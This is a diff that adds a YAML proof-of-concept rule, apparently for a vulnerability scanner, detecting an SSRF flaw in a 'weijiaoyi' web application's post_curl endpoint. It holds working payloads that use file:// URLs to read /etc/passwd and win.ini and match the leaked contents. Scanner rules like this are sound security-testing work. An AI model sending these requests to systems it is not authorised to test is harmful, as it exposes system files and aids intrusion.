@@ -1,0 +1,29 @@
+name: poc-yaml-weijiaoyi-post-curl-ssrf
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /index/Api/post_curl
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: url=file:///etc/passwd&data[]=
+            follow_redirects: false
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /index/Api/post_curl
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: url=file://c:\\windows\\win.ini&data[]=
+            follow_redirects: false
+        expression: response.status == 200 && "for 16-bit app support".bmatches(response.body)
+expression: r0() || r1()
+detail:
+    author: sharecast
+    links:
+        - https://xz.aliyun.com/t/8263#toc-2
